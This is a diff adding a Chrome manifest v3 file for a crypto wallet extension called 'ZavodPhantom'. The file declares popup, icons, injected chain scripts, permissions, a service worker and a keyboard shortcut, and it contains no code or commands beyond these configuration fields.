@@ -1,0 +1,69 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+  "manifest_version": 3,
+  "name": "ZavodPhantom",
+  "description": "A crypto wallet reimagined for DeFi & NFTs",
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "ZavodPhantom"
+  },
+  "icons": {
+    "16": "icon16.png",
+    "48": "icon48.png",
+    "128": "icon128.png",
+    "512": "icon512.png"
+  },
+  "web_accessible_resources": [
+    {
+      "matches": [
+        "<all_urls>"
+      ],
+      "resources": [
+        "solana.js",
+        "evmAsk.js",
+        "evmPhantom.js",
+        "evmMetamask.js",
+        "btc.js"
+      ],
+      "use_dynamic_url": false
+    }
+  ],
+  "content_security_policy": {
+    "extension_pages": "script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; worker-src 'self'"
+  },
+  "permissions": [
+    "activeTab",
+    "alarms",
+    "identity",
+    "storage",
+    "scripting",
+    "tabs",
+    "unlimitedStorage",
+    "webRequest",
+    "sidePanel"
+  ],
+  "host_permissions": [
+    "http://*/*",
+    "https://*/*"
+  ],
+  "background": {
+    "service_worker": "background/serviceWorker.js",
+    "type": "module"
+  },
+  "commands": {
+    "_execute_action": {
+      "suggested_key": {
+        "windows": "Alt+Shift+P",
+        "mac": "Alt+Shift+P",
+        "chromeos": "Alt+Shift+P",
+        "linux": "Alt+Shift+P"
+      }
+    }
+  },
+  "side_panel": {
+    "default_path": "popup.html"
+  },
+  "version": "24.30.0",
+  "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArCzi3FTj9+0P/f+HBJZqeXr2675Q1N2WpRqjhBDzEPOssHwxGM+7bd9GhKWDMLnEl/78b1rutGNYoOEkTWH86nsLx8FXBkNc4RjgJ9FWPxGjaOzGm2wdovYFCpPREz5HA9y2bvVWomSBWUGaxChGnF7iHETzrvYFjgg1KGUD/b7dSe1AOml2OzAk+R+UHhnsjwC1EDtF0vR+xc6k/O/enrwAe5kS4UdMqhigsBsuH1iUuK63fFtI7aPQ+SrQQbEEllD70OdghPCx5xOIv8Zt5NAUmNGZfOS/CEbNMgIassRo14LUqCBQJjwwepfVxn01moEDEG8RtBf3a8Pw4f4N7wIDAQAB"
+}
